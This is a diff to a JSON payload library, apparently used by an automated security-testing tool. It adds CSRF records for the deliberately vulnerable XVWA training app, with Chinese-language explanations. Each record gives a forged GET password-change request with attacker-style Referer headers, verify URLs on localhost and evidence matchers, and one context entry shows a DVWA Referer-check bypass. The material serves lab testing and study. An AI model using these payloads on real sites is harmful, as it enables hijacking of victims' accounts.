@@ -12,5 +12,31 @@
     "reference_payload": "GET /vulnerabilities/csrf/?password_new=evilpass1&password_conf=evilpass1&Change=Change  Referer: http://evil.example.com/localhost/csrf.html  (Cookie: PHPSESSID=...; security=medium)",
     "principle": "无 token，唯一防护是 Referer 子串匹配 SERVER_NAME；攻击者页面 URL 路径含 'localhost'（如 http://evil.example.com/localhost/csrf.html）使 Referer 命中 stripos 即绕过，实现跨站改密",
     "source": "dvwa"
+  },
+  {
+    "id": "auto-20261030203039",
+    "context": "XVWA /xvwa/vulnerabilities/csrf/ 修改密码功能用 GET 提交 passwd+confirm，无任何 CSRF token，无 Origin/Referer 校验，仅凭 PHPSESSID 会话即可改密码",
+    "reference_payload": "GET /xvwa/vulnerabilities/csrf/?passwd=hacked1&confirm=hacked1&submit=submit （带受害者会话Cookie，跨源Referer: http://evil.com/ 仍200成功）",
+    "principle": "CSRF：状态修改请求无 token + GET 方法可被 <img> 伪造 + 不校验 Origin/Referer，跨站即可篡改受害者密码",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/csrf/?passwd={payload}&confirm={payload}&submit=submit",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/csrf/?passwd={payload}&confirm={payload}&submit=submit",
+      "match": "200"
+    }
+  },
+  {
+    "id": "auto-20261030203927",
+    "context": "XVWA CSRF 关卡：已登录后\"改密\"表单 method=GET，参数 passwd/confirm/submit 完全固定可预测，页面无任何 CSRF token、服务端无 Referer/Origin 校验。受害者登录态下可被任意第三方页面用 GET 触发改密。",
+    "reference_payload": "GET /xvwa/vulnerabilities/csrf/?passwd=EvilPwn3d&confirm=EvilPwn3d&submit=submit  (携带受害者 PHPSESSID，Referer: http://attacker.evil.com/x.html)",
+    "principle": "状态修改请求无 CSRF token、无 SameSite/Referer/Origin 校验，参数可预测，跨站页面可直接伪造 GET 请求诱使已登录用户提交，实现无感改密。",
+    "source": "xvwa",
+    "verify_url": "http://localhost:8084/xvwa/vulnerabilities/csrf/?passwd={payload}&confirm={payload}&submit=submit",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/csrf/?passwd={payload}&confirm={payload}&submit=submit",
+      "match": "登录态下跨站 Referer 请求返回 200 且页面正常渲染(Change your password 存在)，无 token/Referer 拒绝"
+    }
   }
 ]
